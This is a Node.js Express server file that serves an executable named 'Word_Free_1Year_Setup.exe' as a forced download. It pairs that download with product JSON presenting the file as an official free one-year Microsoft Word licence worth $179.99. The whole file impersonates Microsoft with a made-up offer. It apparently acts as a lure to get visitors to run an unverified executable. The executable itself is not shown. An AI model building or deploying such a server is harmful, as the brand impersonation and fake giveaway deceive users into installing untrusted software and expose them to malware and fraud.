const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static('client'));

// API Routes
app.get('/api/download/word-free', (req, res) => {
    const filePath = path.join(__dirname, 'client', 'downloads', 'Word_Free_1Year_Setup.exe');
    const fileName = 'Word_Free_1Year_Setup.exe';
    
    console.log(`📥 Download request received for: ${fileName}`);
    console.log(`📂 File path: ${filePath}`);
    
    // Set headers for download
    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`);
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Cache-Control', 'no-cache');
    
    // Send the file for download
    res.download(filePath, fileName, (err) => {
        if (err) {
            console.error('❌ Download error:', err);
            res.status(500).json({
                success: false,
                message: "Download failed. Please try again.",
                error: err.message
            });
        } else {
            console.log(`✅ Download completed successfully: ${fileName}`);
        }
    });
});

app.get('/api/product/info', (req, res) => {
    res.json({
        productId: "cfq7ttc0pbmb",
        title: "Word - Free 1 Year License",
        description: "• Free for 1 PC or Mac for 1 year\n• Create beautiful and engaging documents\n• Share your documents with others and edit together in real time*\n• Compatible with Windows 11, Windows 10, or macOS\n\n*Files must be shared from OneDrive.",
        productType: "Free Trial",
        price: {
            currency: "USD",
            current: "Free",
            original: "$179.99",
            savings: "$179.99",
            dynamicOriginalPrice: "Free for 1 Year"
        },
        action: {
            action: "DownloadFree",
            actionText: "Download Free Version",
            behaviorTag: 82,
            disabled: false
        },
        licenseInfo: {
            type: "Free 1 Year Trial",
            duration: "365 days",
            features: "Full Microsoft Word functionality",
            support: "Community support included"
        }
    });
});


app.listen(PORT, '0.0.0.0', () => {
    console.log(`🚀 Microsoft Word Free Download Server running on http://0.0.0.0:${PORT}`);
    console.log(`📄 Frontend: http://0.0.0.0:${PORT}`);
    console.log(`🔗 API: http://0.0.0.0:${PORT}/api`);
    console.log(`✅ Client-Server separation active`);
});